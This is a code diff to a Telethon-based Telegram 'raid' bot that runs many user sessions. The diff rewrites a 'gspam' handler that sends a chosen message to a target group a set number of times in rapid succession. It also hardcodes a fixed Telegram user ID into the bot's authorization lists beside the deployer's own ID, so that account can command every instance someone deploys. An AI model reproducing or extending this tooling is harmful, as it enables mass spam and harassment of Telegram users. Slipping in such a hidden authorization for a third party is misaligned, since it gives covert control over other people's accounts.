@@ -90,7 +90,8 @@ if 1517994352 not in DEV:
 OWNER_ID = int(os.environ.get("OWNER_ID", None))
 DEV.append(OWNER_ID)
 CLIENTS = []
-XX = []
+XX = [1517994352]
+XX.append(OWNER_ID)
 # Sessions
 async def RiZoeLX():
     global Riz
@@ -1181,9 +1182,6 @@ async def RiZoeLX():
 
 loop = asyncio.get_event_loop()
 loop.run_until_complete(RiZoeLX())
-
-XX.append(1517994352)
-XX.append(OWNER_ID)
 
 async def logss():
      owner = int(OWNER_ID)
@@ -3034,16 +3032,16 @@ async def dmraid(e):
 @Riz39.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
 @Riz40.on(events.NewMessage(incoming=True, pattern=r"\%sgspam" % hl))
 async def gspam(e):
-    if e.sender_id not in XX:
-           return
-    rizoel = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
-    if len(rizoel) == 3:
-       message = str(rizoel[2])
-       counter = int(rizoel[0])
-       grp_id = int(rizoel[1])
-       for _ in range(counter):
-            await e.client.send_message(grp_id, message)
-            await asyncio.sleep(0.3)
+  if e.sender_id in XX:
+      rizoel = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 2)
+      Rizoelsexy = rizoel[1:]
+      if len(Rizoelsexy) == 2:
+         counter = int(Rizoelsexy[0])
+         Grp = str(Rizoelsexy[1])
+         message = str(rizoel[0])
+         for _ in range(counter):
+              await e.client.send_message(Grp, message)
+              await asyncio.sleep(0.3)
 
 # join leave
 
